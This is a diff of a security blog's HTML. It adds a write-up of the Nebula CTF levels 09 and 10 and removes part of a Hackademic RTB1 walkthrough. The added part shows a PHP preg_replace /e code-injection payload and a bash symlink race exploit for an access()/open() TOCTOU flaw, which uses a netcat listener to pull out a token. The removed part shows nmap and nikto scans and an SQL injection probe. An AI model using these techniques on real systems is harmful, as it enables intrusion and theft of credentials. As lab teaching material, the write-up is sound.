+</span><span class='line'>  -r &lt;code>        Run PHP &lt;code> without using script tags &lt;?..?>
+</span><span class='line'>  -B &lt;begin_code>  Run PHP &lt;begin_code> before processing input lines
+</span><span class='line'>  -R &lt;code>        Run PHP &lt;code> for every input line
+</span><span class='line'>  -F &lt;file>        Parse and execute &lt;file> for every input line
+</span><span class='line'>  -E &lt;end_code>    Run PHP &lt;end_code> after processing all input lines
+</span><span class='line'>  -H               Hide any passed arguments from external tools.
+</span><span class='line'>  -s               Output HTML syntax highlighted source.
+</span><span class='line'>  -v               Version number
+</span><span class='line'>  -w               Output source with stripped comments and whitespace.
+</span><span class='line'>  -z &lt;file>        Load Zend extension &lt;file>.
+</span><span class='line'>
+</span><span class='line'>  args...          Arguments passed to script. Use -- args when first argument
+</span><span class='line'>                   starts with - or script is read from stdin
+</span><span class='line'>
+</span><span class='line'>  --ini            Show configuration file names
+</span><span class='line'>
+</span><span class='line'>  --rf &lt;name>      Show information about function &lt;name>.
+</span><span class='line'>  --rc &lt;name>      Show information about class &lt;name>.
+</span><span class='line'>  --re &lt;name>      Show information about extension &lt;name>.
+</span><span class='line'>  --ri &lt;name>      Show configuration for extension &lt;name>.
+</span><span class='line'>
+</span><span class='line'>level09@nebula:/home/flag09$ ./flag09 -a
+</span><span class='line'>Interactive shell
+</span><span class='line'>
+</span><span class='line'>php > system('id');
+</span><span class='line'>uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
+</span><span class='line'>php > system('getflag');
+</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Second way how to solve this challenge is to use PCRE pattern modifiers vulnerability in <a href="https://php.net/manual/en/reference.pcre.pattern.modifiers.php">PREG_REPLACE_EVAL</a>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">sh-4.2$</span> cat /tmp/09
+</span><span class='line'><span class="go">[email bla@blabla.com]</span>
+</span><span class='line'>
+</span><span class='line'><span class="gp">sh-4.2$</span> ./flag09 /tmp/09 testing
+</span><span class='line'><span class="go">bla AT blabla dot com</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Because we cannot use quotes, we can inject something with <a href="https://php.net/manual/en/language.types.string.php#language.types.string.parsing.complex">complex (curly) syntax</a>, that could be used
+for strings representation.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ cat /tmp/09 
+</span><span class='line'>[email {${phpinfo()}}]
+</span><span class='line'>
+</span><span class='line'>sh-4.2$ ./flag09 /tmp/09 | head
+</span><span class='line'>PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
+</span><span class='line'>phpinfo()
+</span><span class='line'>PHP Version => 5.3.6-13ubuntu3.2
+</span><span class='line'>
+</span><span class='line'>System => Linux nebula 3.0.0-12-generic #20-Ubuntu SMP Fri Oct 7 14:50:42 UTC 2011 i686
+</span><span class='line'>Build Date => Oct 13 2011 23:17:32
+</span><span class='line'>Server API => Command Line Interface
+</span><span class='line'>Virtual Directory Support => disabled
+</span><span class='line'>Configuration File (php.ini) Path => /etc/php5/cli
+</span><span class='line'>Loaded Configuration File => /etc/php5/cli/php.ini
+</span><span class='line'>Scan this dir for additional .ini files => /etc/php5/cli/conf.d</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here the second argument $use_me is invoked:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">sh-4.2$</span> cat /tmp/09
+</span><span class='line'><span class="go">[email {${system($use_me)}}]</span>
+</span><span class='line'>
+</span><span class='line'><span class="gp">sh-4.2$</span> ./flag09 /tmp/09 getflag
+</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
+</span><span class='line'><span class="go">PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Actually, I have found the third solution without using $use_me parameter, but recycling $filename:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">sh-4.2$</span> cat /tmp/09
+</span><span class='line'><span class="go">[email {${system($filename)}}]</span>
+</span><span class='line'><span class="go">/bin/sh</span>
+</span><span class='line'>
+</span><span class='line'><span class="gp">sh-4.2$</span> chmod +x /tmp/09
+</span><span class='line'>
+</span><span class='line'><span class="gp">sh-4.2$</span> id
+</span><span class='line'><span class="go">uid=1010(level09) gid=1010(level09) groups=1010(level09)</span>
+</span><span class='line'>
+</span><span class='line'><span class="gp">sh-4.2$</span> /home/flag09/flag09 /tmp/09
+</span><span class='line'><span class="go">PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22</span>
+</span><span class='line'><span class="go">/tmp/09: line 1: {${system($filename)}}]: bad substitution</span>
+</span><span class='line'>
+</span><span class='line'><span class="gp">sh-4.2$</span> id
+</span><span class='line'><span class="go">uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)</span>
+</span><span class='line'>
+</span><span class='line'><span class="gp">sh-4.2$</span> getflag
+</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level10</h2>
+
+<figure class='code'><figcaption><span>basic.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;netinet/in.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">host</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s file host</span><span class="se">\n\t</span><span class="s">sends file to host if you have access to it</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">file</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span><span class='line'>  <span class="n">host</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">access</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">R_OK</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+</span><span class='line'>      <span class="kt">int</span> <span class="n">ffd</span><span class="p">;</span>
+</span><span class='line'>      <span class="kt">int</span> <span class="n">rc</span><span class="p">;</span>
+</span><span class='line'>      <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
+</span><span class='line'>      <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connecting to %s:18211 .. &quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
+</span><span class='line'>      <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+</span><span class='line'>      <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">host</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">18211</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to connect to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
+</span><span class='line'>          <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#define HITHERE &quot;.oO Oo.\n&quot;</span>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">HITHERE</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">HITHERE</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to write banner to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
+</span><span class='line'>          <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'><span class="cp">#undef HITHERE</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connected!</span><span class="se">\n</span><span class="s">Sending file .. &quot;</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="n">ffd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">ffd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Damn. Unable to open file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>          <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">ffd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to read from file: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+</span><span class='line'>          <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;wrote file!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You don&#39;t have access to %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>What to do is immediately clear, there is a race condition in the code, after
+we call access() to some file, it could be different file with the same name,
+which we are trying to open.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>man 2 access
+</span><span class='line'>
+</span><span class='line'>  Warning:  Using access() to check if a user is authorized to, for example, open
+</span><span class='line'>  a file before actually doing so using open(2) creates a security hole, because
+</span><span class='line'>  the user might exploit the short time interval between checking and opening the
+</span><span class='line'>  file to manipulate it.  For this reason, the use of this system call should be
+</span><span class='line'>  avoided.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So /home/flag10/flag10 binary sends arbitrary file with access() permission to
+some host, port 18211.</p>
+
+<p>We can test it in two screens using:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ nc -l 18211
+</span><span class='line'>
+</span><span class='line'>sh-4.2$ /home/flag10/flag10 /etc/passwd 0</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Our exploit:</p>
+
+<figure class='code'><figcaption><span>mklink.sh </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/usr/bin/env bash</span>
+</span><span class='line'>
+</span><span class='line'>run_netcat<span class="o">()</span> <span class="o">{</span>
+</span><span class='line'>  <span class="k">while</span> :<span class="p">;</span> <span class="k">do</span> nc -l 18211<span class="p">;</span> <span class="k">done</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>make_symlinks<span class="o">()</span> <span class="o">{</span>
+</span><span class='line'>  <span class="k">while</span> :<span class="p">;</span> <span class="k">do</span> ln -sf /dev/null /tmp/token <span class="p">;</span> ln -sf /home/flag10/token /tmp/token<span class="p">;</span> <span class="k">done</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>run_flag<span class="o">()</span> <span class="o">{</span>
+</span><span class='line'>  <span class="k">while</span> :<span class="p">;</span> <span class="k">do</span> /home/flag10/flag10 /tmp/token <span class="m">0</span> &gt;/dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">;</span> <span class="k">done</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>run_netcat <span class="p">&amp;</span>
+</span><span class='line'>make_symlinks <span class="p">&amp;</span>
+</span><span class='line'>run_flag <span class="p">&amp;</span>
+</span><span class='line'>
+</span><span class='line'>sleep 0.05
+</span><span class='line'>pkill -P <span class="nv">$$</span> <span class="c"># Kill all children</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">sh-4.2$</span> ./mklink.sh
+</span><span class='line'><span class="go">.oO Oo.</span>
+</span><span class='line'><span class="go">.oO Oo.</span>
+</span><span class='line'><span class="go">.oO Oo.</span>
+</span><span class='line'><span class="go">.oO Oo.</span>
+</span><span class='line'><span class="go">.oO Oo.</span>
+</span><span class='line'><span class="go">.oO Oo.</span>
+</span><span class='line'><span class="go">.oO Oo.</span>
+</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
+</span><span class='line'><span class="go">.oO Oo.</span>
+</span><span class='line'><span class="go">.oO Oo.</span>
+</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
+</span><span class='line'><span class="go">.oO Oo.</span>
+</span><span class='line'><span class="go">.oO Oo.</span>
+</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
+</span><span class='line'><span class="go">.oO Oo.</span>
+</span><span class='line'><span class="go">.oO Oo.</span>
+</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
+</span><span class='line'><span class="go">.oO Oo.</span>
+</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
+</span><span class='line'><span class="go">./mklink.sh: line 20: 31349 Terminated              run_netcat</span>
+</span><span class='line'><span class="go">./mklink.sh: line 20: 31350 Terminated              make_symlinks</span>
+</span><span class='line'><span class="go">./mklink.sh: line 20: 31351 Terminated              run_flag</span>
+</span><span class='line'>
+</span><span class='line'><span class="gp">sh-4.2$</span> su flag10
+</span><span class='line'><span class="go">Password: </span>
+</span><span class='line'>
+</span><span class='line'><span class="gp">sh-4.2$</span> id
+</span><span class='line'><span class="go">uid=989(flag10) gid=989(flag10) groups=989(flag10)</span>
+</span><span class='line'>
+</span><span class='line'><span class="gp">sh-4.2$</span> getflag
+</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1340,590 +2276,6 @@ from output above, there is port-knocking mechanism using sequences 7000,8000,90
 <p>So the SQLi test is validated using string compare operator and it&rsquo;s quite
 non-realistic (and unfair) to have two statements with the different case, that
 was the reason why we didn&rsquo;t found out this firstly.</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/05/29/hackademic-rtb1/">Hackademic: RTB1</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-05-29T14:32:12+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>29</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:32 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/hackademic-rtb1,17/">Hackademic: RTB1</a></p>
-
-<p>We gained the IP address 192.168.80.146 for our testing target.</p>
-
-<p>Nmap output:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap 192.168.80.146 -sV -p-
-</span><span class='line'>
-</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-28 17:14 CEST
-</span><span class='line'>Nmap scan report for 192.168.80.146
-</span><span class='line'>Host is up (0.00032s latency).
-</span><span class='line'>Not shown: 65533 filtered ports
-</span><span class='line'>PORT   STATE  SERVICE VERSION
-</span><span class='line'>22/tcp closed ssh
-</span><span class='line'>80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
-</span><span class='line'>MAC Address: 00:0C:29:01:8A:4D (VMware)
-</span><span class='line'>
-</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
-</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 153.05 seconds</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Nikto output:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h 192.168.80.146 
-</span><span class='line'>- Nikto v2.1.6
-</span><span class='line'>---------------------------------------------------------------------------
-</span><span class='line'>+ Target IP:          192.168.80.146
-</span><span class='line'>+ Target Hostname:    192.168.80.146
-</span><span class='line'>+ Target Port:        80
-</span><span class='line'>+ Start Time:         2015-04-28 17:18:04 (GMT2)
-</span><span class='line'>---------------------------------------------------------------------------
-</span><span class='line'>+ Server: Apache/2.2.15 (Fedora)
-</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, inode: 12748, size: 1475, mtime: Sun Jan  9 18:22:11 2011
-</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
-</span><span class='line'>+ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
-</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
-</span><span class='line'>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
-</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
-</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
-</span><span class='line'>+ 7354 requests: 0 error(s) and 7 item(s) reported on remote host
-</span><span class='line'>+ End Time:           2015-04-28 17:18:15 (GMT2) (11 seconds)
-</span><span class='line'>---------------------------------------------------------------------------
-</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>
-
-
-<p>There was SQL injection on the web page, vulnerable wordpress instance:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.146/Hackademic_RTB1/?cat=1'
-</span><span class='line'>SELECT * FROM wp_categories WHERE cat_ID = 1\\\' LIMIT 1</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This will take longer and it&rsquo;s not necessery to dump everything:</p>
-
